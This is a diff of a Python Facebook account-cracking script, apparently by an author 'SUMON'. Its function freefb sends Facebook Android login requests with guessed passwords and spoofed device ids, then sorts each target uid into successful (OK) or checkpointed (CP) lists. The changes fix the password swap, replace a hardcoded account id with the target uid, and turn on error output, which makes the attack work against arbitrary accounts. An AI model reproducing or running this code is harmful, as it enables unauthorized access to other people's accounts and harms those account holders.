@@ -13,7 +13,6 @@ cps = []
 loop = 0
 idz = []
 plist = []
-error_msg = []
 def clear():
     os.system('clear' if os.name == 'posix' else 'cls')
 
@@ -32,7 +31,7 @@ def banner():
     ║      ███████║╚██████╔╝██║ ╚═╝ ██║╚██████╔╝██║ ╚████║  ║
     ║      ╚══════╝ ╚═════╝ ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝  ║
     ║                                                       ║
-    ║            Facebook Account Checker Tool              ║
+    ║            Facebook Account Tool              ║
     ║                   Version 1.0                         ║
     ║                  Author: SUMON                         ║
     ╚═══════════════════════════════════════════════════════╝
@@ -41,9 +40,9 @@ def banner():
     linex()
 
 def freefb(uid, name, pwx, tl):
-    global loop, oks, cps, error_msg
+    global loop, oks, cps
     
-    sys.stdout.write(f"\r\033[1;37m [SUMON-M1] [{loop}] [OK:{len(oks)}] [CP:{len(cps)}] [error_msg:{len(error_msg)}]\r")
+    sys.stdout.write(f"\r\033[1;37m [SUMON-M1] [{loop}] [OK:{len(oks)}] [CP:{len(cps)}]\r")
     sys.stdout.flush()
     
     try:
@@ -58,8 +57,8 @@ def freefb(uid, name, pwx, tl):
             
             # Generate dynamic values
             current_time = str(int(time.time()))
-            passwordd = f"#PWD_FB4A:0:{current_time}:{pw}"
-            password = f"#PWD_FB4A:0:{current_time}:sumon@12M"
+            password = f"#PWD_FB4A:0:{current_time}:{pw}"
+            passwordd = f"#PWD_FB4A:0:{current_time}:sumon@12M"
             
             # Generate unique device IDs
             adid = str(uuid.uuid4()).upper()
@@ -95,7 +94,7 @@ def freefb(uid, name, pwx, tl):
     'adid': '01a378a8-2b90-498a-bdf1-ae0359bcd2c4',
     'format': 'json',
     'device_id': 'a143397c-0621-4803-a8e5-fcce42e40197',
-    'email': '61578494318368',
+    'email': uid,
     'password': password,
     'generate_analytics_claim': '1',
     'community_id': '',
@@ -153,7 +152,7 @@ def freefb(uid, name, pwx, tl):
                             
                 elif 'error' in q:
                   error_msg = q['error'].get('message', '')
-                  #print(f"\n\033[1;33m⚠️ [error_msg] {error_msg}")
+                  print(f"\n\033[1;33m⚠️ [error_msg] {error_msg}")
                   if 'www.facebook.com' in error_msg:
                       print(f"\n\033[1;33m⚠️ [CP] {uid} | {pw}\033[1;37m")
                       cps.append(uid)
@@ -260,7 +259,7 @@ def f_clone():
 def start():
     """Main start function to initialize the tool"""
     banner()
-    print("\033[1;32m[\033[1;31m✓\033[1;32m] Starting Facebook Account Checker Tool...\033[1;37m")
+    print("\033[1;32m[\033[1;31m✓\033[1;32m] Starting Facebook Tool...\033[1;37m")
     time.sleep(1)
     
     # Check for internet connection
